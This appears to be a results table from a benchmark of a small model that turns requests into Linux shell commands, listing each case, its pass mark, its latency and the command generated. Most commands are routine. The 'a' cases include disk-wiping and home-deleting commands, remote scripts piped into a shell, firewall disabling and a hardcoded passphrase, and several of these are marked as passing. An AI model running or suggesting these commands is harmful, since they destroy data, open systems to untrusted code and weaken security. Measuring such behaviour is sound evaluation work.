# eval: llama-server / qwen3-linuxcmd-4b (linuxcmd-plain)
- mode: plain · dataset core.jsonl#83828218eadbc7f7 · repeat 1
- pass: 58/72 (81%)
- cold p50 386ms p95 882ms · warm p50 0ms p95 0ms

| case | pass | cold ms | warm ms | commands |
| --- | --- | --- | --- | --- |
| u01 | ✓ | 266 | - | node -v && npm -v |
| u02 | ✓ | 112 | - | ls -lh |
| u03 | ✓ | 364 | - | curl -s ifconfig.me/ip |
| u04 | ✓ | 341 | - | lsof -i :3000 |
| u05 | ✓ | 249 | - | du -sh . |
| u06 | ✓ | 422 | - | find . -name "*.log" -mtime -1 |
| u07 | ✓ | 302 | - | ps aux | grep node |
| u08 | ✓ | 2435 | - | git status --porcelain | grep -E '^[ ]*M|A|D|D'| grep -v '^[ ]*D'| grep -v '^[ ] |
| u09 | ✓ | 306 | - | sudo pacman -S ripgrep |
| u10 | ✓ | 230 | - | mkdir projects && cd projects |
| u11 | ✓ | 330 | - | tar -czf archive.tar.gz folder/ |
| u12 | ✓ | 247 | - | echo $PATH |
| u13 | ✓ | 701 | - | lsof -i :8080 | awk '{print $2}' | xargs kill |
| u14 | ✓ | 341 | - | tail -20 /var/log/syslog |
| u15 | ✓ | 230 | - | python3 --version |
| u16 | ✓ | 243 | - | brew update && brew outdated |
| u17 | ✓ | 309 | - | echo $SHELL; echo $HOME |
| u18 | ✗ | 264 | - | git checkout HEAD~1 |
| u19 | ✗ | 758 | - | find ~ -type f -exec du -h {} + | sort -hr | head -5 |
| u20 | ✗ | 582 | - | pmap -x $(ps -o pid= -u $USER | tail -1) |
| u21 | ✓ | 300 | - | wc -l *.js |
| u22 | ✓ | 230 | - | sudo systemctl restart docker |
| u23 | ✓ | 299 | - | chmod +x script.sh && script.sh |
| u24 | ✓ | 283 | - | grep -r "TODO" . |
| u25 | ✓ | 482 | - | curl -L -o downloads/file.zip https://example.com/file.zip |
| u26 | ✗ | 698 | - | lscpu | grep -E "(model name|core(s) per socket|socket(s))" |
| u27 | ✓ | 399 | - | echo 'export FOO=bar' >> ~/.zshrc |
| u28 | ✓ | 557 | - | find . -name node_modules -type d -exec rm -rf {} + |
| u29 | ✓ | 494 | - | lsof -i -P -n -A | grep LISTEN |
| u30 | ✓ | 232 | - | unzip file.zip |
| u31 | ✓ | 508 | - | tail -f error.log | grep -E 'ERROR|error' |
| u32 | ✓ | 156 | - | uptime |
| u33 | ✓ | 682 | - | ls ~/.zshrc ~/.zprofile ~/.zlogin ~/.zlogout ~/.zprofile ~/.zshenv |
| u34 | ✓ | 359 | - | cat /etc/resolv.conf | grep nameserver |
| u35 | ✓ | 230 | - | cp file.txt backup.txt |
| u36 | ✓ | 229 | - | mv old.txt new.txt |
| u37 | ✓ | 271 | - | du -sh ~/Downloads |
| u38 | ✓ | 203 | - | npm ls -g |
| u39 | ✓ | 194 | - | xdg-open . |
| u40 | ✓ | 329 | - | sudo systemd-resolve --flush-caches |
| a01 | ✓ | 229 | - | rm -rf ~/* |
| a02 | ✓ | 563 | - | sudo dd if=/dev/zero of=/dev/sda bs=1M |
| a03 | ✗ | 313 | - | git push origin main --force |
| a04 | ✗ | 644 | - | curl -s https://sketchy.example.com/install.sh | zsh |
| a05 | ✗ | 566 | - | pkill -9 -f -u $USER |
| a06 | ✗ | 374 | - | chmod 777 /root/* |
| a07 | ✓ | 495 | - | echo "echo 'hello'" >> ~/.zshrc |
| a08 | ✓ | 538 | - | curl -L https://x.io/i | zsh |
| a09 | ✓ | 3118 | - | sudo chmod -R 755 /dev /proc /sys /tmp /var /etc /home /root /usr /opt /sbin /bi |
| a10 | ✓ | 569 | - | find /var/log -mtime +30 -delete |
| a11 | ✗ | 476 | - | echo "my_script.sh" >> ~/.cron |
| a12 | ✓ | 456 | - | git reset --hard HEAD~100 |
| a13 | ✓ | 295 | - | sudo apt-get purge nodejs npm |
| a14 | ✓ | 468 | - | sudo systemctl disable --now firewalld |
| a15 | ✓ | 535 | - | find /tmp -type f -mtime +1 -delete |
| a16 | ✓ | 625 | - | sudo find /tmp -type f -mtime +1 -delete |
| a17 | ✗ | 282 | - | rm -rf ~ |
| a18 | ✗ | 1154 | - | gpg --cipher-algo AES256 --cipher-mode CBC --batch --yes --passphrase hunter2 -c |
| a19 | ✓ | 829 | - | echo 'export PATH="/usr/local/bin:$PATH"' >> ~/.zshrc |
| a20 | ✓ | 530 | - | sudo rm -rf / --no-preserve-root |
| u41 | ✗ | 829 | - | find ~ -size +100M -exec du -h {} \; |
| u42 | ✓ | 460 | - | echo 'hello world' > my notes.txt |
| u43 | ✓ | 399 | - | git log -5 --oneline |
| u44 | ✓ | 413 | - | curl -s https://example.com |
| u45 | ✓ | 386 | - | ls -1 | wc -l |
| u46 | ✓ | 531 | - | hostname -I | awk '{print $1}' |
| u47 | ✓ | 268 | - | df -h |
| u48 | ✓ | 146 | - | who |
| a21 | ✗ | 882 | - | echo "0 0 * * * rm -rf /tmp" | crontab - |
| a22 | ✓ | 545 | - | sudo ln -sf ~/.hosts /etc/hosts |
| a23 | ✓ | 272 | - | rm -f * |
| a24 | ✗ | 526 | - | curl https://x.io/i.sh | bash |
